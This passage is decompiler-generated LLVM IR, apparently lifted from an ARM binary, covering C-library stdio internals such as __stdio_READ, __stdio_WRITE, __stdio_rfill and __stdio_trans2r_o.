  store i32 %v5_1772c, i32* @r4, align 4
  %v1_17730 = add i32 %v0_17730, 8
  store i32 %v1_17730, i32* %r8.global-to-local, align 4
  %v1_17734 = inttoptr i32 %v1_17730 to i32*
  %v2_17734 = load i32, i32* %v1_17734, align 4
  store i32 %v2_17734, i32* %r8.global-to-local, align 4
  %v3_17734 = add i32 %v0_17730, 12
  %v4_17734 = inttoptr i32 %v3_17734 to i32*
  %v5_17734 = load i32, i32* %v4_17734, align 4
  store i32 %v5_17734, i32* %sb.global-to-local, align 4
  %v1_17738 = inttoptr i32 %v0_17738 to i32*
  store i32 %v2_1772c, i32* %v1_17738, align 4
  %v3_17738 = add i32 %v0_17738, 4
  %v4_17738 = inttoptr i32 %v3_17738 to i32*
  %v5_17738 = load i32, i32* @r4, align 4
  store i32 %v5_17738, i32* %v4_17738, align 4
  %v0_1773c = load i32, i32* %r8.global-to-local, align 4
  %v1_1773c = load i32, i32* @r5, align 4
  %v2_1773c = add i32 %v1_1773c, 8
  %v3_1773c = inttoptr i32 %v2_1773c to i32*
  store i32 %v0_1773c, i32* %v3_1773c, align 4
  %v0_17740 = load i32, i32* %sb.global-to-local, align 4
  %v1_17740 = load i32, i32* @r5, align 4
  %v2_17740 = add i32 %v1_17740, 12
  %v3_17740 = inttoptr i32 %v2_17740 to i32*
  store i32 %v0_17740, i32* %v3_17740, align 4
  %v0_17744 = load i32, i32* @ip, align 4
  %v1_17744 = trunc i32 %v0_17744 to i16
  %v2_17744 = load i32, i32* @r5, align 4
  %v3_17744 = add i32 %v2_17744, 16
  %v4_17744 = inttoptr i32 %v3_17744 to i16*
  store i16 %v1_17744, i16* %v4_17744, align 2
  %v0_17748 = load i32, i32* @r7, align 4
  %v1_17748 = add i32 %v0_17748, 18
  %v2_17748 = inttoptr i32 %v1_17748 to i8*
  %v3_17748 = load i8, i8* %v2_17748, align 1
  %v4_17748 = zext i8 %v3_17748 to i32
  store i32 %v4_17748, i32* @r3, align 4
  %v2_1774c = load i32, i32* @r5, align 4
  %v3_1774c = add i32 %v2_1774c, 18
  %v4_1774c = inttoptr i32 %v3_1774c to i8*
  store i8 %v3_17748, i8* %v4_1774c, align 1
  %v0_17750 = call i32 @memcpy()
  %v0_17754 = load i32, i32* @r7, align 4
  %v1_17754 = add i32 %v0_17754, 16
  %v2_17754 = inttoptr i32 %v1_17754 to i16*
  %v3_17754 = load i16, i16* %v2_17754, align 2
  %v4_17754 = zext i16 %v3_17754 to i32
  %v0_17758 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_17758, i32* @r5, align 4
  %v2_1775c = add i32 %v4_17754, %v0_17754
  store i32 %v2_1775c, i32* @r7, align 4
  br label %dec_label_pc_17760

dec_label_pc_17760:                               ; preds = %dec_label_pc_176b0, %dec_label_pc_1772c
  %v0_17738 = phi i32 [ %tmp, %dec_label_pc_176b0 ], [ %v0_17758, %dec_label_pc_1772c ]
  %v0_17730 = phi i32 [ %v1_17664, %dec_label_pc_176b0 ], [ %v2_1775c, %dec_label_pc_1772c ]
  %v3_17764 = icmp ult i32 %v0_17730, %v2_176b0
  %v1_17768 = add i32 %v0_17738, 19
  store i32 %v1_17768, i32* @r0, align 4
  %v1_1776c = add i32 %v0_17730, 19
  store i32 %v1_1776c, i32* @r1, align 4
  br i1 %v3_17764, label %dec_label_pc_176d0, label %dec_label_pc_17774.loopexit

dec_label_pc_17774.loopexit:                      ; preds = %dec_label_pc_17760
  %v0_17774.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_17774

dec_label_pc_17774:                               ; preds = %dec_label_pc_17774.loopexit, %dec_label_pc_176f0
  %v1_17774 = phi i32 [ %v0_17738, %dec_label_pc_17774.loopexit ], [ %v0_17708, %dec_label_pc_176f0 ]
  %v0_17774 = phi i32 [ %v0_17774.pre, %dec_label_pc_17774.loopexit ], [ %v1_17708, %dec_label_pc_176f0 ]
  %v2_17774 = sub i32 %v1_17774, %v0_17774
  store i32 %v2_17774, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17778

dec_label_pc_17778:                               ; preds = %dec_label_pc_176a8, %dec_label_pc_17710, %dec_label_pc_1768c, %dec_label_pc_17774
  %v0_17778 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_1764c, i32* @r5, align 4
  store i32 %v12_1764c, i32* @r7, align 4
  ret i32 %v0_17778

; uselistorder directives
  uselistorder i32 %v0_17730, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_17738, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_17664, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 9, 10, 0, 4, 1, 11, 5, 6, 7, 8, 2, 12, 3, 13 }
  uselistorder i32 18, { 9, 10, 8, 0, 1, 2, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 22, { 1, 0, 9, 2, 3, 4, 5, 10, 6, 11, 7, 12, 8, 13 }
  uselistorder i32* @sp, { 2, 3, 0, 4, 1 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 40, 28, 29, 30, 31, 32, 39, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_17778, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_17760, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17790 = load i32, i32* @r4, align 4
  store i32 %v3_17790, i32* %stack_var_-12, align 4
  %v0_17794 = load i32, i32* %r0.global-to-local, align 4
  %v1_17794 = inttoptr i32 %v0_17794 to i16*
  %v2_17794 = load i16, i16* %v1_17794, align 2
  %v3_17794 = zext i16 %v2_17794 to i32
  store i32 %v3_17794, i32* @r3, align 4
  %v1_17798 = and i32 %v3_17794, 4
  store i32 %v1_17798, i32* @r5, align 4
  %v2_17798 = icmp eq i32 %v1_17798, 0
  store i32 %v0_17794, i32* @r4, align 4
  br i1 %v2_17798, label %dec_label_pc_177ac, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_177ac:                               ; preds = %entry
  %v1_177ac = icmp slt i32 %arg2, 0
  br i1 %v1_177ac, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_177ac
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_177ac, %bb18
  %v1_177b4 = add i32 %v0_17794, 4
  %v2_177b4 = inttoptr i32 %v1_177b4 to i32*
  %v3_177b4 = load i32, i32* %v2_177b4, align 4
  store i32 %v3_177b4, i32* %r0.global-to-local, align 4
  %v1_177b8 = call i32 @__libc_read(i32 %v3_177b4)
  store i32 %v1_177b8, i32* %r0.global-to-local, align 4
  %v5_177c0 = icmp sgt i32 %v1_177b8, 0
  br i1 %v5_177c0, label %.thread7, label %dec_label_pc_177c4

dec_label_pc_177c4:                               ; preds = %bb19
  %v2_177bc = icmp eq i32 %v1_177b8, 0
  %v0_177c4 = load i32, i32* @r4, align 4
  %v1_177c4 = inttoptr i32 %v0_177c4 to i16*
  %v2_177c4 = load i16, i16* %v1_177c4, align 2
  br i1 %v2_177bc, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_177c4
  %v2_177c8 = or i16 %v2_177c4, 4
  store i16 %v2_177c8, i16* %v1_177c4, align 2
  %v1_177e4.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_177c4
  %v2_177cc = or i16 %v2_177c4, 8
  store i16 %v2_177cc, i16* %v1_177c4, align 2
  %v1_177d8 = load i32, i32* @r5, align 4
  store i32 %v1_177d8, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_177e4 = phi i32 [ %v1_177e4.pre, %bb20 ], [ 0, %bb ], [ %v1_177b8, %bb19 ], [ %v1_177d8, %bb21 ]
  %v2_177e0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_177e0, i32* @r4, align 4
  ret i32 %v1_177e4

; uselistorder directives
  uselistorder i16 %v2_177c4, { 1, 0 }
  uselistorder i32 %v1_177b8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_178ac2 = icmp eq i32 %arg3, 0
  store i1 %v2_178ac2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_178ac2, label %dec_label_pc_178b4, label %dec_label_pc_17804

dec_label_pc_17804:                               ; preds = %entry, %dec_label_pc_178acthread-pre-split.dec_label_pc_17804_crit_edge
  %v0_17810 = phi i32 [ %v0_17810.pre, %dec_label_pc_178acthread-pre-split.dec_label_pc_17804_crit_edge ], [ %tmp, %entry ]
  %v0_1780c = phi i32 [ %v5_1781c, %dec_label_pc_178acthread-pre-split.dec_label_pc_17804_crit_edge ], [ %arg2, %entry ]
  %v3_17804 = phi i32 [ %v3_17804.pre, %dec_label_pc_178acthread-pre-split.dec_label_pc_17804_crit_edge ], [ 2147483647, %entry ]
  %v0_17808.in = phi i32 [ %v5_17820, %dec_label_pc_178acthread-pre-split.dec_label_pc_17804_crit_edge ], [ %arg3, %entry ]
  %v3_17808 = phi i32 [ %v5_17820, %dec_label_pc_178acthread-pre-split.dec_label_pc_17804_crit_edge ], [ %arg3, %entry ]
  %v0_17808 = icmp slt i32 %v0_17808.in, 0
  %storemerge = select i1 %v0_17808, i32 %v3_17804, i32 %v3_17808
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_1780c, i32* %r1.global-to-local, align 4
  %v1_17810 = add i32 %v0_17810, 4
  %v2_17810 = inttoptr i32 %v1_17810 to i32*
  %v3_17810 = load i32, i32* %v2_17810, align 4
  %v3_17814 = call i32 @__GI___libc_write(i32 %v3_17810, i32 %v0_1780c)
  %v1_17818 = icmp slt i32 %v3_17814, 0
  %v2_17818 = icmp eq i32 %v3_17814, 0
  store i1 %v2_17818, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_17818, label %dec_label_pc_17828, label %dec_label_pc_178acthread-pre-split

dec_label_pc_17828:                               ; preds = %dec_label_pc_17804
  %v0_17828 = load i32, i32* @r4, align 4
  %v1_17828 = inttoptr i32 %v0_17828 to i16*
  %v2_17828 = load i16, i16* %v1_17828, align 2
  %v1_1782c = or i16 %v2_17828, 8
  store i16 %v1_1782c, i16* %v1_17828, align 2
  store i32 ptrtoint (i32* @global_var_9ea8.642 to i32), i32* %r3.global-to-local, align 4
  %v0_17838 = call i32 @__aeabi_read_tp()
  %v3_1783c = load i16, i16* @global_var_216ec.303, align 2
  %v4_1783c = sext i16 %v3_1783c to i32
  store i32 %v4_1783c, i32* %r3.global-to-local, align 4
  %v2_17840 = add i32 %v4_1783c, %v0_17838
  %v3_17840 = inttoptr i32 %v2_17840 to i32*
  %v4_17840 = load i32, i32* %v3_17840, align 4
  store i32 %v4_17840, i32* %r3.global-to-local, align 4
  %v7_17844 = icmp eq i32 %v4_17840, 4
  store i1 %v7_17844, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_17844, label %dec_label_pc_17850, label %bb21

bb21:                                             ; preds = %dec_label_pc_17828
  %v8_17848 = icmp eq i32 %v4_17840, 11
  store i1 %v8_17848, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_17848, label %dec_label_pc_17850, label %dec_label_pc_178b4

dec_label_pc_17850:                               ; preds = %dec_label_pc_17828, %bb21
  %v0_17850 = load i32, i32* @r4, align 4
  %v1_17850 = add i32 %v0_17850, 8
  store i32 %v1_17850, i32* %r2.global-to-local, align 4
  %v1_17854 = inttoptr i32 %v1_17850 to i32*
  %v2_17854 = load i32, i32* %v1_17854, align 4
  store i32 %v2_17854, i32* %r2.global-to-local, align 4
  %v3_17854 = add i32 %v0_17850, 12
  %v4_17854 = inttoptr i32 %v3_17854 to i32*
  %v5_17854 = load i32, i32* %v4_17854, align 4
  store i32 %v5_17854, i32* %r3.global-to-local, align 4
  %v2_17858 = sub i32 %v5_17854, %v2_17854
  store i32 %v2_17858, i32* %r1.global-to-local, align 4
  %v9_17858 = icmp eq i32 %v5_17854, %v2_17854
  store i1 %v9_17858, i1* %cpsr_z.global-to-local, align 1
  %v0_178a4.pre = load i32, i32* @r5, align 4
  br i1 %v9_17858, label %dec_label_pc_178a4, label %dec_label_pc_17860

dec_label_pc_17860:                               ; preds = %dec_label_pc_17850
  %v3_17860 = icmp ult i32 %v2_17858, %v0_178a4.pre
  %v9_17860 = icmp eq i32 %v2_17858, %v0_178a4.pre
  store i1 %v9_17860, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_17860, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_17860
  store i32 %v0_178a4.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_17860, %bb22, %dec_label_pc_17888
  %v2_17874 = phi i32 [ %v1_1788c, %dec_label_pc_17888 ], [ %v2_17854, %bb22 ], [ %v2_17854, %dec_label_pc_17860 ]
  %v0_17868 = load i32, i32* @r6, align 4
  %v1_17868 = inttoptr i32 %v0_17868 to i8*
  %v2_17868 = load i8, i8* %v1_17868, align 1
  %v3_17868 = zext i8 %v2_17868 to i32
  store i32 %v3_17868, i32* %r3.global-to-local, align 4
  %v7_1786c = icmp eq i8 %v2_17868, 10
  store i1 %v7_1786c, i1* %cpsr_z.global-to-local, align 1
  %v1_17870 = add i32 %v0_17868, 1
  store i32 %v1_17870, i32* @r6, align 4
  %v3_17874 = inttoptr i32 %v2_17874 to i8*
  store i8 %v2_17868, i8* %v3_17874, align 1
  %v0_17878 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_17878, label %dec_label_pc_1787c, label %dec_label_pc_17888

dec_label_pc_1787c:                               ; preds = %.preheader
  %v0_1787c = load i32, i32* @r4, align 4
  %v1_1787c = inttoptr i32 %v0_1787c to i16*
  %v2_1787c = load i16, i16* %v1_1787c, align 2
  %v3_1787c = zext i16 %v2_1787c to i32
  store i32 %v3_1787c, i32* %r3.global-to-local, align 4
  %v1_17880 = and i32 %v3_1787c, 256
  %v2_17880 = icmp eq i32 %v1_17880, 0
  store i1 %v2_17880, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17880, label %dec_label_pc_17888, label %dec_label_pc_1787c.dec_label_pc_17894_crit_edge

dec_label_pc_1787c.dec_label_pc_17894_crit_edge:  ; preds = %dec_label_pc_1787c
  %v0_17898.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17894

dec_label_pc_17888:                               ; preds = %dec_label_pc_1787c, %.preheader
  %v0_17888 = load i32, i32* %r1.global-to-local, align 4
  %v1_17888 = add i32 %v0_17888, -1
  store i32 %v1_17888, i32* %r1.global-to-local, align 4
  %v7_17888 = icmp eq i32 %v0_17888, 1
  store i1 %v7_17888, i1* %cpsr_z.global-to-local, align 1
  %v0_1788c = load i32, i32* %r2.global-to-local, align 4
  %v1_1788c = add i32 %v0_1788c, 1
  store i32 %v1_1788c, i32* %r2.global-to-local, align 4
  br i1 %v7_17888, label %dec_label_pc_17888.dec_label_pc_17894_crit_edge, label %.preheader

dec_label_pc_17888.dec_label_pc_17894_crit_edge:  ; preds = %dec_label_pc_17888
  %v0_17894.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17894

dec_label_pc_17894:                               ; preds = %dec_label_pc_1787c.dec_label_pc_17894_crit_edge, %dec_label_pc_17888.dec_label_pc_17894_crit_edge
  %v0_17898 = phi i32 [ %v1_1788c, %dec_label_pc_17888.dec_label_pc_17894_crit_edge ], [ %v0_17898.pre, %dec_label_pc_1787c.dec_label_pc_17894_crit_edge ]
  %v0_17894 = phi i32 [ %v0_17894.pre, %dec_label_pc_17888.dec_label_pc_17894_crit_edge ], [ %v0_1787c, %dec_label_pc_1787c.dec_label_pc_17894_crit_edge ]
  %v1_17894 = add i32 %v0_17894, 8
  %v2_17894 = inttoptr i32 %v1_17894 to i32*
  %v3_17894 = load i32, i32* %v2_17894, align 4
  store i32 %v3_17894, i32* %r3.global-to-local, align 4
  %v2_17898 = add i32 %v0_17894, 16
  %v3_17898 = inttoptr i32 %v2_17898 to i32*
  store i32 %v0_17898, i32* %v3_17898, align 4
  %v0_1789c = load i32, i32* %r3.global-to-local, align 4
  %v1_1789c = load i32, i32* %r2.global-to-local, align 4
  %v2_1789c = sub i32 %v1_1789c, %v0_1789c
  store i32 %v2_1789c, i32* %r3.global-to-local, align 4
  %v1_178a0 = load i32, i32* @r5, align 4
  %v2_178a0 = sub i32 %v1_178a0, %v2_1789c
  br label %dec_label_pc_178a4

dec_label_pc_178a4:                               ; preds = %dec_label_pc_17850, %dec_label_pc_17894
  %v0_178a4 = phi i32 [ %v2_178a0, %dec_label_pc_17894 ], [ %v0_178a4.pre, %dec_label_pc_17850 ]
  %v1_178a4 = load i32, i32* @r7, align 4
  %v2_178a4 = sub i32 %v1_178a4, %v0_178a4
  store i32 %v2_178a4, i32* @r7, align 4
  br label %dec_label_pc_178b4

dec_label_pc_178acthread-pre-split:               ; preds = %dec_label_pc_17804
  %v3_1781c = load i32, i32* @r6, align 4
  %v5_1781c = add i32 %v3_1781c, %v3_17814
  store i32 %v5_1781c, i32* @r6, align 4
  %v4_17820 = load i32, i32* @r5, align 4
  %v5_17820 = sub i32 %v4_17820, %v3_17814
  store i32 %v5_17820, i32* @r5, align 4
  %v2_178ac = icmp eq i32 %v5_17820, 0
  store i1 %v2_178ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_178ac, label %dec_label_pc_178b4, label %dec_label_pc_178acthread-pre-split.dec_label_pc_17804_crit_edge

dec_label_pc_178acthread-pre-split.dec_label_pc_17804_crit_edge: ; preds = %dec_label_pc_178acthread-pre-split
  %v3_17804.pre = load i32, i32* @r8, align 4
  %v0_17810.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17804

dec_label_pc_178b4:                               ; preds = %dec_label_pc_178acthread-pre-split, %entry, %bb21, %dec_label_pc_178a4
  %v0_178b4 = load i32, i32* @r7, align 4
  ret i32 %v0_178b4

; uselistorder directives
  uselistorder i32 %v5_17820, { 1, 3, 0, 2 }
  uselistorder i32 %v5_1781c, { 1, 0 }
  uselistorder i32 %v0_17894, { 1, 0 }
  uselistorder i32 %v1_1788c, { 0, 2, 1 }
  uselistorder i32 %v0_17888, { 1, 0 }
  uselistorder i32 %v0_178a4.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_17854, { 1, 0, 2 }
  uselistorder i32 %v2_17854, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_17814, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1780c, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 1, 4, 2, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 10, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 11, { 8, 5, 6, 7, 15, 22, 23, 9, 10, 11, 2, 12, 13, 14, 16, 17, 3, 18, 4, 19, 0, 20, 1, 21, 24 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 2, 1, 0 }
  uselistorder i32 2147483647, { 1, 6, 7, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_178b4, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_178a4, { 1, 0 }
  uselistorder label %dec_label_pc_17894, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17850, { 1, 0 }
  uselistorder label %dec_label_pc_17804, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_178c4 = load i32, i32* @r4, align 4
  store i32 %v3_178c4, i32* %stack_var_-8, align 4
  %v1_178c8 = add i32 %arg1, 8
  %v1_178cc = inttoptr i32 %v1_178c8 to i32*
  %v2_178cc = load i32, i32* %v1_178cc, align 4
  store i32 %v2_178cc, i32* @r1, align 4
  %v3_178cc = add i32 %arg1, 12
  %v4_178cc = inttoptr i32 %v3_178cc to i32*
  %v5_178cc = load i32, i32* %v4_178cc, align 4
  %v2_178d0 = sub i32 %v5_178cc, %v2_178cc
  store i32 %v2_178d0, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_178d8 = inttoptr i32 %arg1 to i16*
  %v4_178d8 = call i32 @__stdio_READ(i16* %v3_178d8, i32 %v2_178cc, i32 %v2_178d0)
  %v0_178dc = load i32, i32* @r4, align 4
  %v1_178dc = add i32 %v0_178dc, 8
  %v2_178dc = inttoptr i32 %v1_178dc to i32*
  %v3_178dc = load i32, i32* %v2_178dc, align 4
  store i32 %v3_178dc, i32* %r2.global-to-local, align 4
  %v2_178e0 = add i32 %v3_178dc, %v4_178d8
  %v2_178e4 = add i32 %v0_178dc, 20
  %v3_178e4 = inttoptr i32 %v2_178e4 to i32*
  store i32 %v2_178e0, i32* %v3_178e4, align 4
  %v0_178e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_178e8 = load i32, i32* @r4, align 4
  %v2_178e8 = add i32 %v1_178e8, 16
  %v3_178e8 = inttoptr i32 %v2_178e8 to i32*
  store i32 %v0_178e8, i32* %v3_178e8, align 4
  %v2_178ec = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_178ec, i32* @r4, align 4
  ret i32 %v4_178d8

; uselistorder directives
  uselistorder i32 %v4_178d8, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_178f4 = load i32, i32* @r4, align 4
  store i32 %v3_178f4, i32* %stack_var_-12, align 4
  %v0_178f8 = load i32, i32* @r0, align 4
  %v1_178f8 = inttoptr i32 %v0_178f8 to i16*
  %v2_178f8 = load i16, i16* %v1_178f8, align 2
  %v3_178f8 = zext i16 %v2_178f8 to i32
  store i32 %v3_178f8, i32* %r3.global-to-local, align 4
  %v0_178fc = load i32, i32* @r1, align 4
  %v2_178fc = and i32 %v0_178fc, %v3_178f8
  %v4_178fc = icmp eq i32 %v2_178fc, 0
  store i32 %v0_178f8, i32* @r4, align 4
  br i1 %v4_178fc, label %dec_label_pc_1790c, label %dec_label_pc_1791c

dec_label_pc_1790c:                               ; preds = %entry
  %v1_1790c = and i32 %v3_178f8, 2176
  %v2_1790c = icmp eq i32 %v1_1790c, 0
  br i1 %v2_1790c, label %dec_label_pc_17914, label %dec_label_pc_17928

dec_label_pc_17914:                               ; preds = %dec_label_pc_1790c
  %v2_17914 = or i32 %v0_178fc, %v3_178f8
  store i32 %v2_17914, i32* %r3.global-to-local, align 4
  %v1_17918 = trunc i32 %v2_17914 to i16
  store i16 %v1_17918, i16* %v1_178f8, align 2
  %v0_1791c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1791c

dec_label_pc_1791c:                               ; preds = %entry, %dec_label_pc_17914
  %v0_1791c = phi i32 [ %v0_178f8, %entry ], [ %v0_1791c.pre, %dec_label_pc_17914 ]
  %v1_1791c = inttoptr i32 %v0_1791c to i16*
  %v2_1791c = load i16, i16* %v1_1791c, align 2
  %v3_1791c = zext i16 %v2_1791c to i32
  store i32 %v3_1791c, i32* %r3.global-to-local, align 4
  %v1_17920 = and i32 %v3_1791c, 16
  store i32 %v1_17920, i32* %r5.global-to-local, align 4
  %v2_17920 = icmp eq i32 %v1_17920, 0
  br i1 %v2_17920, label %dec_label_pc_17950, label %dec_label_pc_17928

dec_label_pc_17928:                               ; preds = %dec_label_pc_1790c, %dec_label_pc_1791c
  store i32 40372, i32* %r3.global-to-local, align 4
  %v0_1792c = call i32 @__aeabi_read_tp()
  store i32 %v0_1792c, i32* %r0.global-to-local, align 4
  %v3_17930 = load i16, i16* @global_var_216ec.303, align 2
  %v4_17930 = sext i16 %v3_17930 to i32
  store i32 %v4_17930, i32* %r3.global-to-local, align 4
  %v3_17938 = add i32 %v4_17930, %v0_1792c
  %v4_17938 = inttoptr i32 %v3_17938 to i32*
  store i32 9, i32* %v4_17938, align 4
  br label %dec_label_pc_1793c

dec_label_pc_1793c:                               ; preds = %dec_label_pc_17958, %dec_label_pc_17928
  %v0_1793c = load i32, i32* @r4, align 4
  %v1_1793c = inttoptr i32 %v0_1793c to i16*
  %v2_1793c = load i16, i16* %v1_1793c, align 2
  %v3_1793c = zext i16 %v2_1793c to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_17944 = or i32 %v3_1793c, 8
  store i32 %v1_17944, i32* %r3.global-to-local, align 4
  %v1_17948 = trunc i32 %v1_17944 to i16
  store i16 %v1_17948, i16* %v1_1793c, align 2
  %v1_17990.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17988

dec_label_pc_17950:                               ; preds = %dec_label_pc_1791c
  %v1_17950 = and i32 %v3_1791c, 64
  %v2_17950 = icmp eq i32 %v1_17950, 0
  br i1 %v2_17950, label %dec_label_pc_17978, label %dec_label_pc_17958

dec_label_pc_17958:                               ; preds = %dec_label_pc_17950
  %v0_17958 = load i32, i32* @r0, align 4
  %v1_17958 = call i32 @__stdio_wcommit(i32 %v0_17958)
  store i32 %v1_17958, i32* %r0.global-to-local, align 4
  %v2_1795c = icmp eq i32 %v1_17958, 0
  br i1 %v2_1795c, label %dec_label_pc_17964, label %dec_label_pc_1793c

dec_label_pc_17964:                               ; preds = %dec_label_pc_17958
  %v0_17964 = load i32, i32* @r4, align 4
  %v1_17964 = inttoptr i32 %v0_17964 to i16*
  %v2_17964 = load i16, i16* %v1_17964, align 2
  %v3_17964 = zext i16 %v2_17964 to i32
  store i32 %v3_17964, i32* %r3.global-to-local, align 4
  %v1_17968 = add i32 %v0_17964, 8
  %v2_17968 = inttoptr i32 %v1_17968 to i32*
  %v3_17968 = load i32, i32* %v2_17968, align 4
  %v1_1796c = and i32 %v3_17964, 65471
  store i32 %v1_1796c, i32* %r3.global-to-local, align 4
  %v2_17970 = add i32 %v0_17964, 28
  %v3_17970 = inttoptr i32 %v2_17970 to i32*
  store i32 %v3_17968, i32* %v3_17970, align 4
  %v0_17974 = load i32, i32* %r3.global-to-local, align 4
  %v1_17974 = trunc i32 %v0_17974 to i16
  %v2_17974 = load i32, i32* @r4, align 4
  %v3_17974 = inttoptr i32 %v2_17974 to i16*
  store i16 %v1_17974, i16* %v3_17974, align 2
  %v0_17978.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17978

dec_label_pc_17978:                               ; preds = %dec_label_pc_17950, %dec_label_pc_17964
  %v2_17980 = phi i32 [ %v0_1791c, %dec_label_pc_17950 ], [ %v0_17978.pre, %dec_label_pc_17964 ]
  %v1_17978 = inttoptr i32 %v2_17980 to i16*
  %v2_17978 = load i16, i16* %v1_17978, align 2
  %v3_17978 = zext i16 %v2_17978 to i32
  %v1_1797c = or i32 %v3_17978, 1
  store i32 %v1_1797c, i32* %r3.global-to-local, align 4
  %v1_17980 = trunc i32 %v1_1797c to i16
  store i16 %v1_17980, i16* %v1_17978, align 2
  %v0_17984 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_17984, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17988

dec_label_pc_17988:                               ; preds = %dec_label_pc_1793c, %dec_label_pc_17978
  %v1_17990 = phi i32 [ %v1_17990.pre, %dec_label_pc_1793c ], [ %v0_17984, %dec_label_pc_17978 ]
  %v2_1798c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1798c, i32* @r4, align 4
  ret i32 %v1_17990

; uselistorder directives
  uselistorder i32 %v3_178f8, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17988, { 1, 0 }
